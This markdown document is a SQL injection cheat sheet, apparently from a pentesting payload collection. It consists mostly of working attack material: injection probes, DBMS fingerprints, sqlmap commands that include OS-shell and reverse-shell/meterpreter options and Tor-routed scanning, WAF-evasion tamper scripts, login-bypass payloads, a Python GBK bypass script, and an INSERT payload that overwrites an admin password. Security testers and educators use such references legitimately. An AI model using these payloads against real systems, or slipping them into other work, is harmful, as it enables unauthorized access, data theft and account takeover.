# SQL injection

A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application.

## Summary

* [CheatSheet MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20injection/MSSQL%20Injection.md)
* [CheatSheet MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20injection/MySQL%20Injection.md)
* [CheatSheet OracleSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20injection/OracleSQL%20Injection.md)
* [CheatSheet PostgreSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20injection/PostgreSQL%20Injection.md)
* [CheatSheet SQLite Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20injection/SQLite%20Injection.md)
* [CheatSheet Cassandra Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20injection/Cassandra%20Injection.md)
* [Entry point detection](#entry-point-detection)
* [DBMS Identification](#dbms-identification)
* [SQL injection using SQLmap](#sql-injection-using-sqlmap)
* [Authentication bypass](#authentication-bypass)
* [Polyglot injection](#polyglot-injection-multicontext)
* [Routed injection](#routed-injection)
* [Insert Statement - ON DUPLICATE KEY UPDATE](#insert-statement---on-duplicate-key-update)
* [WAF Bypass](#waf-bypass)

## Entry point detection

Detection of an SQL injection entry point
Simple characters

```sql
'
%27
"
%22
#
%23
;
%3B
)
Wildcard (*)
```
**Recommended list:** [SQLi Error Detector](https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/Intruders/cp_SQLi_error_detector.txt)

Multiple encoding

```sql
%%2727
%25%27
```

Merging characters

```sql
`+HERP
'||'DERP
'+'herp
' 'DERP
'%20'HERP
'%2B'HERP
```

Logic Testing

```sql
page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false
```
If you want to test possible combinations that, if vulnerable, the web should return the results of *id=1* it is **recommended:** [SQLi id 1](https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/Intruders/cp_SQLi_id_1.txt)

If you want to test combinatios that always return *true* it is **recommended:** [SQLi True](https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/Intruders/cp_SQLi_or_true.txt)

Weird characters

```sql
Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
transformed into U+0022 QUOTATION MARK (")
Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
transformed into U+0027 APOSTROPHE (')
```

## DBMS Identification

```c
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```

## SQL injection using SQLmap

Basic arguments for SQLmap

```powershell
sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
```

Custom injection in UserAgent/Header/Referer/Cookie

```powershell
python sqlmap.py -u "http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
The injection is located at the '*'
```

Second order injection

```powershell
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```

Shell

```powershell
SQL Shell
python sqlmap.py -u "http://example.com/?id=1"  -p id --sql-shell

Simple Shell
python sqlmap.py -u "http://example.com/?id=1"  -p id --os-shell

Dropping a reverse-shell / meterpreter
python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn
```

Crawl a website with SQLmap and auto-exploit

```powershell
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms
```

Using TOR with SQLmap

```powershell
sqlmap -u "http://www.target.com" --tor --tor-type=SOCKS5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5
```

Using Chrome cookie and a Proxy

```powershell
sqlmap -u "https://test.com/index.php?id=99" --load-cookie=/media/truecrypt1/TI/cookie.txt --proxy "http://127.0.0.1:8080"  -f  --time-sec 15 --level 3
```

Using suffix to tamper the injection

```powershell
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```

General tamper option and tamper's list

```powershell
tamper=name_of_the_tamper
```

| Tamper | Description |
| --- | --- |
|apostrophemask.py | Replaces apostrophe character with its UTF-8 full width counterpart |
|apostrophenullencode.py | Replaces apostrophe character with its illegal double unicode counterpart|
|appendnullbyte.py | Appends encoded NULL byte character at the end of payload |
|base64encode.py | Base64 all characters in a given payload  |
|between.py | Replaces greater than operator ('>') with 'NOT BETWEEN 0 AND #' |
|bluecoat.py | Replaces space character after SQL statement with a valid random blank character.Afterwards replace character = with LIKE operator  |
|chardoubleencode.py | Double url-encodes all characters in a given payload (not processing already encoded) |
|commalesslimit.py | Replaces instances like 'LIMIT M, N' with 'LIMIT N OFFSET M'|
|commalessmid.py | Replaces instances like 'MID(A, B, C)' with 'MID(A FROM B FOR C)'|
|concat2concatws.py | Replaces instances like 'CONCAT(A, B)' with 'CONCAT_WS(MID(CHAR(0), 0, 0), A, B)'|
|charencode.py | Url-encodes all characters in a given payload (not processing already encoded)  |
|charunicodeencode.py | Unicode-url-encodes non-encoded characters in a given payload (not processing already encoded)  |
|equaltolike.py | Replaces all occurances of operator equal ('=') with operator 'LIKE'  |
|escapequotes.py | Slash escape quotes (' and ") |
|greatest.py | Replaces greater than operator ('>') with 'GREATEST' counterpart |
|halfversionedmorekeywords.py | Adds versioned MySQL comment before each keyword  |
|ifnull2ifisnull.py | Replaces instances like 'IFNULL(A, B)' with 'IF(ISNULL(A), B, A)'|
|modsecurityversioned.py | Embraces complete query with versioned comment |
|modsecurityzeroversioned.py | Embraces complete query with zero-versioned comment |
|multiplespaces.py | Adds multiple spaces around SQL keywords |
|nonrecursivereplacement.py | Replaces predefined SQL keywords with representations suitable for replacement (e.g. .replace("SELECT", "")) filters|
|percentage.py | Adds a percentage sign ('%') infront of each character  |
|overlongutf8.py | Converts all characters in a given payload (not processing already encoded) |
|randomcase.py | Replaces each keyword character with random case value |
|randomcomments.py | Add random comments to SQL keywords|
|securesphere.py | Appends special crafted string|
|sp_password.py |  Appends 'sp_password' to the end of the payload for automatic obfuscation from DBMS logs |
|space2comment.py | Replaces space character (' ') with comments |
|space2dash.py | Replaces space character (' ') with a dash comment ('--') followed by a random string and a new line ('\n') |
|space2hash.py | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n') |
|space2morehash.py | Replaces space character (' ') with a pound character ('#') followed by a random string and a new line ('\n') |
|space2mssqlblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
|space2mssqlhash.py | Replaces space character (' ') with a pound character ('#') followed by a new line ('\n') |
|space2mysqlblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
|space2mysqldash.py | Replaces space character (' ') with a dash comment ('--') followed by a new line ('\n') |
|space2plus.py |  Replaces space character (' ') with plus ('+')  |
|space2randomblank.py | Replaces space character (' ') with a random blank character from a valid set of alternate characters |
|symboliclogical.py | Replaces AND and OR logical operators with their symbolic counterparts (&& and ||) |
|unionalltounion.py | Replaces UNION ALL SELECT with UNION SELECT |
|unmagicquotes.py | Replaces quote character (') with a multi-byte combo %bf%27 together with generic comment at the end (to make it work) |
|uppercase.py | Replaces each keyword character with upper case value 'INSERT'|
|varnish.py | Append a HTTP header 'X-originating-IP' |
|versionedkeywords.py | Encloses each non-function keyword with versioned MySQL comment |
|versionedmorekeywords.py | Encloses each keyword with versioned MySQL comment |
|xforwardedfor.py | Append a fake HTTP header 'X-Forwarded-For'|

## Authentication bypass

**Small lists recommended**: [AuthBypass1](https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/Intruders/Auth_Bypass.txt) and [AuthBypass2](https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/Intruders/Auth_Bypass2.txt)

**Big list recommended** list for login bypass: [Authbypass](https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/Intruders/cp_SQLi_authbypass.txt)
Try to inject each line of the list in the username and password at the same time.

## Authentication Bypass (Raw MD5)

When a raw md5 is used, the pass will be queried as a simple string, not a hexstring.

```php
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```

Allowing an attacker to craft a string with a `true` statement such as `' or 'SOMETHING`

```php
md5("ffifdyop", true) = 'or'6�]��!r,��b
```

Challenge demo available at [http://web.jarvisoj.com:32772](http://web.jarvisoj.com:32772)


## Hash Authentication Bypass

```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```
**Recomended**: [Passwd1234](https://github.com/carlospolop-forks/PayloadsAllTheThings/blob/master/SQL%20injection/Intruders/cp_SQLi_passwd_1234.txt)
(Use as username each line of the file and as password *1234*)

## GBK Authentication Bypass

IF ' is being scaped you can use %A8%27, and when *'* gets scaped it will be created: 0xA80x5c0x27 (*╘'*)
```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```

Python script:
```python
import requests
url = "http://example.com/index.php" 
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3') 
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"} 
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url}) 
print r.text
```

## Polyglot injection (multicontext)

```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

## Insert Statement - ON DUPLICATE KEY UPDATE

ON DUPLICATE KEY UPDATE keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:

```sql
Inject using payload:
  attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" --

The query would look like this:
INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" -- ", "bcrypt_hash_of_your_password_input");

This query will insert a row for the user “attacker_dummy@example.com”. It will also insert a row for the user “admin@example.com”.
Because this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL to update the `password` column of the already existing row to "bcrypt_hash_of_qwerty".

After this, we can simply authenticate with “admin@example.com” and the password “qwerty”!
```

## Insert Statement - Extract information 

### Creating 2 accounts at the same time

When trying to create a new user and username, password and email are needed:

```sql
SQLi payload:
username=TEST&password&=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```

### Using decimal or hexadecimal

With this technique you can extract information creating only 1 account. It is important to note that you don't need to comment anything.

Using **hex2dec** and **substr**:

```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
To get the text you can use:

```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```

Using **hex** and **replace** (and **substr**):

```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```

## Routed SQL injection
Routed SQL injection is a situation where the injectable query is not the one which gives output but the output of injectable query goes to the query which gives output.
([Paper](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

Example:

```sql
Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```


## WAF Bypass

No Space (%20) - bypass using whitespace alternatives

```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```

No Whitespace - bypass using comments

```sql
?id=1/*comment*/and/**/1=1/**/--
```

No Whitespace - bypass using parenthesis

```sql
?id=(1)and(1)=(1)--
```

No Comma - bypass using OFFSET, FROM and JOIN

```sql
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```

Blacklist using keywords - bypass using uppercase/lowercase

```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```

Blacklist using keywords case insensitive - bypass using an equivalent operator

```sql
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```

Information_schema.tables Alternative

```sql
select * from mysql.innodb_table_stats;
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| database_name  | table_name            | last_update         | n_rows | clustered_index_size | sum_of_other_index_sizes |
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+
| dvwa           | guestbook             | 2017-01-19 21:02:57 |      0 |                    1 |                        0 |
| dvwa           | users                 | 2017-01-19 21:03:07 |      5 |                    1 |                        0 |
...
+----------------+-----------------------+---------------------+--------+----------------------+--------------------------+

mysql> show tables in dvwa;
+----------------+
| Tables_in_dvwa |
+----------------+
| guestbook      |
| users          |
+----------------+
```

Version Alternative

```sql
mysql> select @@innodb_version;
+------------------+
| @@innodb_version |
+------------------+
| 5.6.31           |
+------------------+

mysql> select @@version;
+-------------------------+
| @@version               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+

mysql> mysql> select version();
+-------------------------+
| version()               |
+-------------------------+
| 5.6.31-0ubuntu0.15.10.1 |
+-------------------------+
```

## Thanks to - Other resources

* Detect SQLi
  * [Manual SQL Injection Discovery Tips](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
  * [NetSPI SQL Injection Wiki](https://sqlwiki.netspi.com/)
* MySQL:
  * [PentestMonkey's mySQL injection cheat sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
  * [Reiners mySQL injection Filter Evasion Cheatsheet] (https://websec.wordpress.com/2010/12/04/sqli-filter-evasion-cheat-sheet-mysql/)
  * [Alternative for Information_Schema.Tables in MySQL](https://osandamalith.com/2017/02/03/alternative-for-information_schema-tables-in-mysql/)
  * [The SQL Injection Knowledge base](https://websec.ca/kb/sql_injection)
* MSSQL:
  * [EvilSQL's Error/Union/Blind MSSQL Cheatsheet] (http://evilsql.com/main/page2.php)
  * [PentestMonkey's MSSQL SQLi injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
* ORACLE:
  * [PentestMonkey's Oracle SQLi Cheatsheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet)
* POSTGRESQL:
  * [PentestMonkey's Postgres SQLi Cheatsheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)
* Others
  * [SQLi Cheatsheet - NetSparker](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
  * [Access SQLi Cheatsheet] (http://nibblesec.org/files/MSAccessSQLi/MSAccessSQLi.html)
  * [PentestMonkey's Ingres SQL Injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/ingres-sql-injection-cheat-sheet)
  * [Pentestmonkey's DB2 SQL Injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/db2-sql-injection-cheat-sheet)
  * [Pentestmonkey's Informix SQL Injection Cheat Sheet] (http://pentestmonkey.net/cheat-sheet/sql-injection/informix-sql-injection-cheat-sheet)
  * [SQLite3 Injection Cheat sheet] (https://sites.google.com/site/0x7674/home/sqlite3injectioncheatsheet)
  * [Ruby on Rails (Active Record) SQL Injection Guide] (http://rails-sqli.org/)
  * [ForkBombers SQLMap Tamper Scripts Update](http://www.forkbombers.com/2016/07/sqlmap-tamper-scripts-update.html)
  * [SQLi in INSERT worse than SELECT](https://labs.detectify.com/2017/02/14/sqli-in-insert-worse-than-select/)
  * [Manual SQL Injection Tips](https://gerbenjavado.com/manual-sql-injection-discovery-tips/)
* Second Order:
  * [Analyzing CVE-2018-6376 – Joomla!, Second Order SQL Injection](https://www.notsosecure.com/analyzing-cve-2018-6376/)
  * [Exploiting Second Order SQLi Flaws by using Burp & Custom Sqlmap Tamper](https://pentest.blog/exploiting-second-order-sqli-flaws-by-using-burp-custom-sqlmap-tamper/)
* Sqlmap:
  * [#SQLmap protip @zh4ck](https://twitter.com/zh4ck/status/972441560875970560)
